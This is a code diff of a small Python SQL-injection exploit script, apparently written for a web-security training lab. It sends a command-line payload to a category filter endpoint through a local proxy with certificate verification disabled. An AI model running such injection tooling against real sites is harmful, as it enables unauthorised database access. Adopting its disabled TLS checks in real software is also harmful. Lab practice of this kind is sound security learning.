@@ -1,15 +1,19 @@
 import requests
 import sys
 import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'https://127.0.0.1:8080', 'htpps': 'http://127.0.0.1:8080'}
 
 def exploit_sqli(url, payload):
     uri = '/filter?category='
-    r = requests.get(url + uri + payload, verify=false, proxies=proxies)
-    if ()
+    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    if "Giant Grasshopper" in r.text:
+        return True
+    else:
+        return False
 
- if __name__ == "__main__":
+if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
